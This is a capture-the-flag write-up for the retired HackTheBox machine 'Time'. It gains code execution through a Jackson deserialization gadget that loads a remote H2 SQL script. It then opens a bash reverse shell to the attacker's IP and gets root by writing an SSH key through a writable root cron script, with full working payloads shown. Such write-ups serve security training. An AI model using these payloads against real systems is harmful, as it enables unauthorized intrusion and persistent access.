This is a writeup about a retired HacktheBox machine:
[Time](https://www.hackthebox.com/home/machines/profile/286) publish on
October 24, 2020 by
[egotisticalSW](https://www.hackthebox.com/home/users/profile/94858) and
[felamos ](https://www.hackthebox.com/home/users/profile/27390).
This box is rated as a medium box. It implies a hard foothold using Jackson and
some Google fu. The root part is quit fast as there is a writable bash script
running regularly as root.

<!-- PELICAN_END_SUMMARY -->

# Foothold

## Recon

Let us start as always by a `nmap` scan. Only port 80 (HTTP) and 22 (SSH) are
open.

    :::text
    # Nmap 7.91 scan initiated Wed Nov  11 12:02:12 2020 as: nmap -sS -p- -oN nmap 10.129.29.179

    # Nmap done at Wed Nov  11 12:02:28 2020 -- 1 IP address (1 host up) scanned in 15.91 seconds

## Web

The website is an online tool to beautify and validate json data.

![/media/2021.04/time_01.png]{: .image-process-article-image}

When we try to validate "garbage" input. We got an error message "Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'qe': was expecting ('true', 'false' or 'null')"

We see that the website is using the Jackson library.

As we want a RCE we start a few Google search with "jackson fasterxml rce".
The results are from 2017:

* https://medium.com/@swapneildash/understanding-insecure-implementation-of-jackson-deserialization-7b3d409d2038
* https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/
* https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062


We continue our searches and finally get to "jackson gadget". Which lead us to a
more recent [article about Jackson gadgets](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html).


We send the following request (we just URL encoded the data parameter)

    :::text
    POST / HTTP/1.1

    mode=2&data=["ch.qos.logback.core.db.DriverManagerConnectionSource",+{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT+FROM+'http://10.10.14.25:8000/inject.sql'"}]

Our inject.sql file looks like the following:

    :::text
    CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
            String[] command = {"bash", "-c", cmd};
            java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
            return s.hasNext() ? s.next() : "";  }
    $$;
    CALL SHELLEXEC('<payload>')


We start with a first simple payload `wget http://10.10.14.25:8000/rce`
as we see the query in our python server log we know that we have RCE

We change the payload to get a [reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
`bash -i >& /dev/tcp/10.10.14.25/4242 0>&1`

This allows us to get a shell and grab the user flag.

    :::text
    kali@kali:/tmp$ nc -l -p4242
    bash: cannot set terminal process group (958): Inappropriate ioctl for device
    bash: no job control in this shell
    pericles@time:/var/www/html$ cat /home/pericles/user.txt
    cat /home/pericles/user.txt
    74555f76d2e8013945afd9233ca2f219

# Root

We start by checking our privileges. We are not part of any specific group. As we don't know our password we cannot use sudo.

    :::text
    pericles@time:/var/www/html$ id
    id
    uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)

As we want to transfer file and have a better shell, we "upload" our SSH key:

    :::text
    mkdir /home/pericles/.ssh
    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/ElCFvS<SNIP>' > /home/pericles/.ssh/authorized_keys

We upload [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) using scp and run it.
We discover that we have access to the /usr/bin/timer_backup.sh file (read and write)

    :::text
    [+] .sh files in path
    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
    /usr/bin/gettext.sh
    You own the script: /usr/bin/timer_backup.sh
    /usr/bin/rescan-scsi-bus.sh

We take a look at the file. It seems that root is regulary making a backup of the website.


    :::text
    pericles@time:~$ cat /usr/bin/timer_backup.sh
    #!/bin/bash
    zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip


We modify the file using Vim and add the following lines

    :::text
    mkdir /root/.ssh
    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/ElCFv<SNIP>' > /root/.ssh/authorized_keys

Waiting a few seconds and connecting back to the box with the root user allow us to get a shell and grab the flag.


    :::text
    kali@kali:~$ ssh root@10.129.29.179

# Wrapping up

The root part was easy, the jackson exploitation was harder and mostly some Google fu.
Nonetheless an interesting box to play with Java Deserialization vulnerabilities.
